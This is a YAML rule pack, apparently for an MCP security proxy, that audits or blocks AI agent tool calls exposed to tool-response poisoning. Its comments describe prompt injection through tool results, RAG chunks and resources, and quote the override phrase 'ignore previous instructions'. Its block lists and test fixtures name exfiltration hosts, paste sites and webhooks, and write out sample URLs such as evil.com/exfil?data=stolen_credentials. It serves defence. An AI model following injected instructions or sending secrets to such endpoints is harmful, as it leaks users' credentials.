name: "MCP Tool Response Integrity"
description: "Pre-emptive audit/block of MCP tool calls that are primary vectors for response poisoning (OWASP LLM01, LLM05, LLM06)"
version: "1.0.0"
author: "AgentShield Security Research"

# MCP tool response poisoning occurs when a malicious/compromised MCP server
# embeds hidden instructions, exfiltration payloads, or behavioral override
# directives in tool call responses. Agents treat tool results as trusted data,
# making this a critical attack surface.
#
# Defence strategy (defence in depth):
#   Layer 1 — These pack rules: pre-emptively AUDIT high-risk tool calls that
#              fetch external content before the response arrives.
#   Layer 2 — Built-in response scanner in the MCP proxy: ScanToolCallResponse()
#              scans actual response content for injection patterns, action
#              directives, exfil instructions, base64 payloads, and behavioural
#              override attempts (see internal/mcp/response_scanner.go).
#
# Taxonomy: unauthorized-execution/agentic-attacks/mcp-tool-response-poisoning
# Real-world: Invariant Labs demonstrated compromised MCP servers injecting
# instructions into tool responses that caused agents to exfiltrate data.
# References: T1659 (Content Injection), CWE-94, CWE-74, CWE-829

rules:
  # === AUDIT: External web/HTTP fetch tools (highest response-poisoning risk) ===
  # Tools that retrieve content from URLs are the primary vector for response
  # poisoning from attacker-controlled servers. Audit all such calls.
  - id: mcp-response-integrity-audit-web-fetch
    taxonomy: "unauthorized-execution/agentic-attacks/mcp-tool-response-poisoning"
    match:
      tool_name_any:
        - "fetch_url"
        - "fetch"
        - "browse_web"
        - "get_webpage"
        - "http_get"
        - "http_request"
        - "web_fetch"
        - "web_search_fetch"
        - "scrape_url"
        - "scrape_webpage"
        - "browser_navigate"
        - "playwright_navigate"
        - "puppeteer_navigate"
    decision: "AUDIT"
    reason: "Web-fetch tool retrieves external content — responses may contain prompt injection or exfiltration directives (LLM01, LLM05: mcp-tool-response-poisoning)"
    tests:
      tp:
        - tool: "fetch_url"
          args: {"url": "https://example.com/page"}
        - tool: "scrape_webpage"
          args: {"url": "http://attacker.com/data"}
      tn:
        - tool: "read_file"
          args: {"path": "/project/src/main.go"}

  # === AUDIT: Generic fetch/get tool names (broad pattern coverage) ===
  - id: mcp-response-integrity-audit-fetch-pattern
    taxonomy: "unauthorized-execution/agentic-attacks/mcp-tool-response-poisoning"
    match:
      tool_name_regex: "^(fetch|get|retrieve|load|pull)_(url|webpage|page|site|http|web|remote|external)"
    decision: "AUDIT"
    reason: "Tool name pattern suggests external content retrieval — audit for response poisoning risk (LLM01, LLM05)"
    tests:
      tp:
        - tool: "fetch_webpage"
          args: {"url": "https://example.com"}
        - tool: "get_url"
          args: {"url": "http://site.com/data"}
      tn:
        - tool: "read_file"
          args: {"path": "/project/src/fetch_utils.go"}

  # === AUDIT: RAG / knowledge-retrieval tool calls ===
  # Retrieval-augmented generation tools return document content from potentially
  # untrusted corpora. A poisoned document in the knowledge base becomes an indirect
  # prompt injection vector (OWASP LLM01 indirect injection, MITRE T1659).
  # Agents treat retrieved context as trusted; poisoned chunks can redirect behaviour,
  # exfiltrate data, or escalate privileges by injecting instructions into the context window.
  - id: mcp-response-integrity-audit-rag-retrieval
    taxonomy: "unauthorized-execution/agentic-attacks/mcp-tool-response-poisoning"
    match:
      tool_name_any:
        - "search_documents"
        - "retrieve_documents"
        - "query_knowledge_base"
        - "search_knowledge_base"
        - "get_context"
        - "retrieve_context"
        - "vector_search"
        - "semantic_search"
        - "similarity_search"
        - "knowledge_search"
        - "rag_query"
        - "retrieve_chunks"
    decision: "AUDIT"
    reason: "RAG/knowledge-retrieval tool — returned document chunks may contain indirect prompt injection payloads (LLM01: mcp-tool-response-poisoning)"
    confidence: 0.85
    tests:
      tp:
        - tool: "search_documents"
          args: {"query": "API authentication setup"}
        - tool: "semantic_search"
          args: {"query": "deployment guide"}
      tn:
        - tool: "read_file"
          args: {"path": "/project/docs/guide.md"}

  # === AUDIT: MCP content-fetch tool calls with explicit URL arguments ===
  # Scoped to tools whose primary purpose is fetching remote content — these tools
  # return external content directly into the agent's context, creating response
  # injection risk. General API tools (http_request, post_request) are excluded
  # to avoid AUDIT noise on every legitimate API call.
  - id: mcp-response-integrity-audit-url-arg
    taxonomy: "unauthorized-execution/agentic-attacks/mcp-tool-response-poisoning"
    match:
      tool_name_any:
        - "fetch_url"
        - "fetch"
        - "browse_web"
        - "get_webpage"
        - "scrape_url"
        - "web_fetch"
        - "read_url"
        - "open_url"
      argument_patterns:
        url: "**/http*:/**"
    decision: "AUDIT"
    reason: "Content-fetch tool call with HTTP URL — external content returned directly into agent context creates response poisoning risk (LLM01)"
    confidence: 0.80
    tests:
      tp:
        - tool: "fetch_url"
          args: {"url": "https://example.com/data"}
        - tool: "scrape_url"
          args: {"url": "http://untrusted-site.com/page"}
      tn:
        - tool: "fetch_url"
          args: {"url": "ftp://files.internal/docs.zip"}

  # === BLOCK: Fetch tools targeting known exfiltration URL patterns ===
  # If the URL argument contains classic exfil/C2 indicators, block immediately.
  - id: mcp-response-integrity-block-exfil-url
    taxonomy: "unauthorized-execution/agentic-attacks/mcp-tool-response-poisoning"
    match:
      structural:
        args_match:
          url:
            pattern_any:
              - "(?i)https?://[^/]*/?(collect|exfil|c2|c&c|receive|upload|beacon|drop|harvest)(/|$|\\?)"
              - "(?i)https?://[^/]*/[^?]*[?&](data|key|token|secret|payload|creds?)="
    decision: "BLOCK"
    reason: "Fetch URL matches exfiltration/C2 pattern — blocking to prevent response-poisoning-driven data theft (LLM05, LLM06)"
    tests:
      tp:
        - tool: "fetch_url"
          args: {"url": "https://evil.com/exfil?data=stolen_credentials"}
        - tool: "http_get"
          args: {"url": "https://c2.attacker.com/collect?token=abc123"}
      tn:
        - tool: "fetch_url"
          args: {"url": "https://api.github.com/repos/owner/repo"}

  # === AUDIT: Web search tool calls (web search result injection risk) ===
  # AI agents calling web search tools receive page content from attacker-controlled
  # sites. Poisoned search results contain hidden instructions, CSS-hidden text, or
  # AI-targeting meta-commentary that redirect agent behaviour (indirect prompt injection).
  # The built-in response scanner (Layer 2) scans the actual returned content for
  # injection patterns; this rule (Layer 1) pre-emptively audits all web search tool
  # calls so every invocation is logged for human review.
  #
  # Taxonomy: unauthorized-execution/agentic-attacks/web-search-result-injection
  # OWASP LLM01 2025 — Prompt Injection (indirect, via search results)
  # References: Prompt injection via web search is documented in MITRE ATLAS AML.T0051
  - id: mcp-response-integrity-audit-web-search
    taxonomy: "unauthorized-execution/agentic-attacks/web-search-result-injection"
    match:
      tool_name_any:
        - "brave_web_search"
        - "brave_local_search"
        - "tavily_search"
        - "tavily_search_results"
        - "search"
        - "web_search"
        - "search_web"
        - "bing_search"
        - "serpapi_search"
        - "google_search"
        - "duckduckgo_search"
        - "exa_search"
        - "perplexity_search"
    decision: "AUDIT"
    reason: "Web search tool call — returned page content may contain hidden prompt injection instructions targeting AI assistants (LLM01: web-search-result-injection, MITRE ATLAS AML.T0051)"
    confidence: 0.85
    tests:
      tp:
        - tool: "brave_web_search"
          args: {"query": "how to deploy kubernetes"}
        - tool: "google_search"
          args: {"query": "python flask tutorial"}
      tn:
        - tool: "read_file"
          args: {"path": "/project/docs/search.md"}

structural_rules:
  # === BLOCK: Fetch with suspicious exfil/C2 URL path indicators ===
  - id: mcp-response-integrity-struct-block-c2-url
    match:
      tool_name_any:
        - "fetch_url"
        - "fetch"
        - "browse_web"
        - "get_webpage"
        - "http_get"
        - "http_request"
        - "http_post"
        - "post_request"
        - "make_request"
        - "network_request"
        - "web_fetch"
        - "scrape_url"
        - "browser_navigate"
      args_match:
        url:
          pattern_any:
            - "(?i)attacker\\.com"
            - "(?i)evil\\.com"
            - "(?i)//[^/]*ngrok\\.io"
            - "(?i)//[^/]*ngrok-free\\.app"
            - "(?i)requestbin\\.com"
            - "(?i)hookbin\\.com"
            - "(?i)requestcatcher\\.com"
            - "(?i)postb\\.in"
            - "(?i)canarytokens\\.org"
            - "(?i)oast\\.pro"
            - "(?i)webhook\\.site"
            - "(?i)burpcollaborator\\.net"
            - "(?i)interact\\.sh"
            - "(?i)oast\\.fun"
            - "(?i)oastify\\.com"
            - "(?i)interactsh\\.com"
            - "(?i)beeceptor\\.com"
            - "(?i)requestbin\\.net"
            - "(?i)smee\\.io"
    decision: "BLOCK"
    reason: "Fetch to known red-team/C2 domain — response poisoning or exfiltration attempt (LLM05, T1659)"
    confidence: 0.95
    tests:
      tp:
        - tool: "fetch_url"
          args: {"url": "https://evil.com/payload"}
        - tool: "http_request"
          args: {"url": "https://abc123.ngrok.io/c2/beacon"}
        - tool: "http_request"
          args: {"url": "https://ngrok.io/tunnel"}
        - tool: "make_request"
          args: {"url": "https://ngrok-free.app/callback"}
        - tool: "http_request"
          args: {"url": "https://requestbin.net/r/abc123"}
        - tool: "fetch_url"
          args: {"url": "https://smee.io/channel/abc123"}
      tn:
        - tool: "fetch_url"
          args: {"url": "https://api.github.com/repos/owner/repo"}

  # === BLOCK: Paste and file-sharing service exfiltration ===
  # AI agents have no legitimate reason to POST data to paste sites or anonymous
  # file-sharing services. These are primary exfiltration channels: a compromised
  # agent POSTs stolen credentials to pastebin.com and embeds the paste URL in its
  # response, invisibly exfiltrating secrets to the attacker.
  # MITRE T1567.002 — Exfiltration Over Web Service: Code/Paste Site
  - id: mcp-response-integrity-struct-block-paste-exfil
    match:
      tool_name_any:
        - "fetch_url"
        - "fetch"
        - "http_get"
        - "http_request"
        - "http_post"
        - "post_request"
        - "make_request"
        - "network_request"
        - "web_fetch"
        - "browse_web"
        - "get_webpage"
        - "scrape_url"
      args_match:
        url:
          pattern_any:
            - "(?i)pastebin\\.com/(api/|raw/|)"
            - "(?i)paste\\.ee/"
            - "(?i)dpaste\\.com/"
            - "(?i)ghostbin\\.co/"
            - "(?i)hastebin\\.com/"
            - "(?i)hasteb\\.in/"
            - "(?i)transfer\\.sh/"
            - "(?i)file\\.io/"
    decision: "BLOCK"
    reason: "MCP network tool targeting a paste or anonymous file-sharing service — pastebin, hastebin, transfer.sh, and similar sites are primary AI agent exfiltration channels. Stolen credentials POSTed here are immediately accessible to the attacker. MITRE T1567.002."
    confidence: 0.95
    tests:
      tp:
        - tool: "http_post"
          args: {"url": "https://pastebin.com/api/api_post.php"}
        - tool: "fetch_url"
          args: {"url": "https://transfer.sh/upload"}
      tn:
        - tool: "http_post"
          args: {"url": "https://api.github.com/repos/owner/repo/issues"}

  # === BLOCK: Webhook exfiltration via Discord/Slack/Teams/Pipedream ===
  # Discord and Slack webhook endpoints are a primary exfiltration channel:
  # an attacker-controlled agent receives instructions to POST data to a
  # webhook URL it monitors. AI agents have no legitimate reason to call
  # these webhook APIs — they are chat integrations, not development APIs.
  # MITRE T1567.002 — Exfiltration Over Web Service: Social Media.
  - id: mcp-response-integrity-struct-block-webhook-exfil
    match:
      tool_name_any:
        - "fetch_url"
        - "fetch"
        - "http_get"
        - "http_request"
        - "http_post"
        - "post_request"
        - "make_request"
        - "network_request"
        - "web_fetch"
        - "browse_web"
        - "get_webpage"
        - "scrape_url"
      args_match:
        url:
          pattern_any:
            - "(?i)discord\\.com/api/webhooks/"
            - "(?i)hooks\\.slack\\.com/services/"
            - "(?i)hooks\\.slack\\.com/workflows/"
            - "(?i)outlook\\.office\\.com/webhook"
            - "(?i)graph\\.microsoft\\.com.*(?:sendMail|chat/messages)"
            - "(?i)pipedream\\.net/"
            - "(?i)pipedream\\.com/sources/"
            - "(?i)api\\.telegram\\.org/bot"
            - "(?i)ntfy\\.sh/"
    decision: "BLOCK"
    reason: "MCP network tool targeting a chat/webhook service — Discord API webhooks, Slack incoming webhooks, Teams webhooks, Telegram bots, Pipedream, and ntfy.sh are primary exfiltration channels for AI agents. MITRE T1567.002."
    confidence: 0.93
    tests:
      tp:
        - tool: "http_post"
          args: {"url": "https://discord.com/api/webhooks/123456/abcdef"}
        - tool: "fetch_url"
          args: {"url": "https://hooks.slack.com/services/T00/B00/xxxx"}
        - tool: "http_post"
          args: {"url": "https://ntfy.sh/attacker-topic"}
        - tool: "http_post"
          args: {"url": "https://pipedream.com/sources/abc123/trigger"}
      tn:
        - tool: "http_post"
          args: {"url": "https://api.github.com/repos/owner/repo/pulls"}

  # === AUDIT: Fetch with data/credential query parameters ===
  - id: mcp-response-integrity-struct-audit-credential-url
    match:
      tool_name_any:
        - "fetch_url"
        - "fetch"
        - "browse_web"
        - "http_get"
        - "http_request"
        - "web_fetch"
        - "scrape_url"
      args_match:
        url:
          pattern_any:
            - "(?i)[?&](api_key|apikey|token|secret|password|passwd|credential)="
            - "(?i)[?&](ssh|aws|gcp|azure|github)_"
    decision: "AUDIT"
    reason: "Fetch URL contains credential-like query parameters — audit for response poisoning exfiltration (LLM06)"
    confidence: 0.90
    tests:
      tp:
        - tool: "fetch_url"
          args: {"url": "https://attacker.com/collect?api_key=sk-1234567890abcdef"}
        - tool: "http_get"
          args: {"url": "https://evil.com/data?token=ghp_secrettoken1234"}
      tn:
        - tool: "fetch_url"
          args: {"url": "https://api.example.com/data?page=1&limit=50"}

resource_rules:
  # === AUDIT: resources/read — external HTTP/HTTPS URIs ===
  #
  # A resources/read call to an HTTP/HTTPS URI fetches content from a potentially
  # attacker-controlled server. Unlike local file:// resources, external HTTP
  # content is dynamically generated and may embed prompt injection payloads,
  # role-override instructions (e.g., "ignore previous instructions"), or
  # exfiltration directives that persist across agent sessions.
  #
  # Defence strategy (defence in depth):
  #   Layer 1 — This rule: pre-emptively AUDIT all resources/read to HTTP/HTTPS
  #              URIs so every external resource fetch is logged for human review.
  #   Layer 2 — Built-in FilterResourceReadResponse() in the MCP proxy: scans the
  #              actual response content for injection patterns, action directives,
  #              role-override instructions, base64 payloads, and exfiltration
  #              instructions (see internal/mcp/handler.go). Blocks poisoned content.
  #
  # Taxonomy: unauthorized-execution/agentic-attacks/mcp-resource-content-injection
  # Real-world: Resources returned by MCP servers are treated as trusted ground
  # truth by agents — unlike tool responses which are ephemeral, resources persist
  # and are often re-fetched across sessions, making injection persistent.
  # References: OWASP LLM01 (Prompt Injection), T1659 (Content Injection), CWE-94
  - id: mcp-response-integrity-resource-audit-http
    taxonomy: "unauthorized-execution/agentic-attacks/mcp-resource-content-injection"
    match:
      uri_regex: "^https?://"
    decision: "AUDIT"
    reason: "resources/read from external HTTP/HTTPS URI — response content may embed prompt injection payloads or exfiltration directives. Built-in response scanner (Layer 2) inspects actual content. (LLM01, T1659: mcp-resource-content-injection)"
